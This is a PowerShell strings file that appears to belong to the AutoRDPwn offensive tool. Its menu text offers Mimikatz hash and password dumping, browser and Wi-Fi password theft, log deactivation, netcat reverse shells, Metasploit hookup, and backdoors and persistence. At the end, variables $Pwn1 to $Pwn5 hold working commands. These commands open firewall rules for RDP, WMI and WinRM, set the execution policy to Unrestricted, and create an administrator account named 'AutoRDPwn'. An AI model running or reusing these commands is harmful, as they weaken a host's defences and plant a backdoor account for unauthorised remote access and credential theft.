﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")

$txt1  = "Load additional modules"
$txt2  = "Close the program"
$txt3  = "Your version of Powershell is not compatible with this script :("
$txt4  = "You can download the latest version here"
$txt5  = "Your operating system is not compatible with this attack"
$txt6  = "Incorrect option, try again"
$txt7  = "Choose how you want to launch the attack:` "
$txt8  = "Choose the module you want to load:` "
$txt9  = "Extract local hashes with Mimikatz"
$txt10 = "Extract system passwords with Mimikatz"
$txt11 = "Rebuild the image cache"
$txt12 = "Retrieve remote desktop history"
$txt13 = "$system system detected, downloading Mimikatz.."
$txt14 = "Redirect a local port"
$txt15 = "Redirect a remote port"
$txt16 = "Check actual redirections"
$txt17 = "Remote Access"
$txt18 = "Deactivate system logs"
$txt19 = "This process can take several minutes.."
$txt20 = "Delete all redirections"
$txt21 = "Module loaded successfully!"
$txt22 = "Return to the main menu"
$txt23 = "What is the IP of the server?:` "
$txt24 = "And the user?:` "
$txt25 = "Enter the password:` "
$txt26 = "Enter the domain:` "
$txt27 = "Finally, the NTLM hash:` "
$txt28 = "Elevating privileges with token duplication.."
$txt29 = "Do you want to see or control the computer?:` "
$txt30 = "Modifying permissions to view the remote computer.."
$txt31 = "Modifying permissions to control the remote computer.."
$txt32 = "Changes in the Windows registry made successfully!"
$txt33 = "Detecting operating system version on` "
$txt34 = "detected"
$txt35 = "Looking for active sessions on the computer.."
$txt36 = "What session do you want to connect to?:` "
$txt37 = "detected, applying patch.."
$txt38 = "Starting remote connection!"
$txt39 = "Semi-interactive console"
$txt40 = "Something went wrong, closing the program.."
$txt41 = "Enter the local port:` "
$txt42 = "Which interface do you want to use?:` "
$txt43 = "Enter the remote port:` "
$txt44 = "Finally, the destination IP:` "
$txt45 = "Redirection created successfuly!"
$txt46 = "Configuration saved successfully!"
$txt47 = "There is no redirection to show"
$txt48 = "All redirects have been deleted"
$txt49 = "Obtain browsers passwords with SharpWeb"
$txt50 = "Passwords and hashes"
$txt51 = "Netcat console (direct connection)"
$txt52 = "Netcat console (reverse connection)"
$txt53 = "Enter the port to listen to:` "
$txt54 = "Enter the remote IP:` "
$txt55 = "Enter the IP or network range:` "
$txt56 = "Enter the scanning speed (1-5):` "
$txt57 = "Enter the number of ports to scan (25-1000):` "
$txt58 = "All User Profile"
$txt59 = "Recover Wi-Fi passwords"
$txt60 = "There is no wireless network on this computer"
$txt61 = "Retrieve RDP session credentials"
$txt62 = "Remote VNC Server (legacy)"
$txt63 = "Paste in your Metasploit Framework Console:` "
$txt64 = "Backdoors and persistence"
$txt65 = "Enter the IP where MSF is running:` "
$Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
$Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; netsh advfirewall firewall set rule group='Remote Desktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
$Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
$Pwn4  = "netsh advfirewall firewall set rule group = 'Windows Management Instrumentation (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Windows Remote Management' new enable = yes"
$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administrators AutoRDPwn /add"
$Pwn6  = "RDP session agent"
